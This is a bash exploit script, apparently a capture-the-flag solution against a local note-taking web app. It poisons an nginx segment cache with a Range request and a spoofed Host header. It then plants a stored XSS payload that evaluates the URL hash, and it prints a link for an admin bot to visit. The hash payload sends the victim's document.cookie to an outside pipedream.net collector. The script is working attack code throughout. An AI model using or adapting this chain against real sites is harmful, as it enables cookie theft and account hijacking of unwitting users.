HOST='localhost:30080'
INTERNAL_HOST='nginx'
CREATE_URL="http://$HOST/new-note"
UPDATE_URL="http://$HOST/update-note"
MEMO_URL="http://$HOST/memo.html?$(date +%s)"

PADDING1=AAAAAA
PADDING2=0123456789012345678901234567890123456789012
NOTE_PAYLOAD='img src=x onerror=eval(location.hash.slice(1)) alt='
HASH_PAYLOAD="location='https://eoxtkp7evqjan29.m.pipedream.net/?cookie='+document.cookie"

# new note
RESULT=$(curl $CREATE_URL --data "title=mp4&body=$PADDING1" -i 2>&1 | grep "Location: " | tr -d '\r\n')
NOTE_PATH=${RESULT#"Location: "}
NOTE_ID=${NOTE_PATH#"/notes/"}

echo "note created: $NOTE_ID"

# segment cache
curl "http://$HOST$NOTE_PATH" -H 'range: bytes=0-1023' -H "host: $INTERNAL_HOST" > /dev/null 2>&1

# save note again
curl $UPDATE_URL --data "noteId=${NOTE_ID}&title=mp4&body=$PADDING2$NOTE_PAYLOAD" > /dev/null 2>&1

# done!
echo "report this: http://$HOST$NOTE_PATH#$HASH_PAYLOAD"
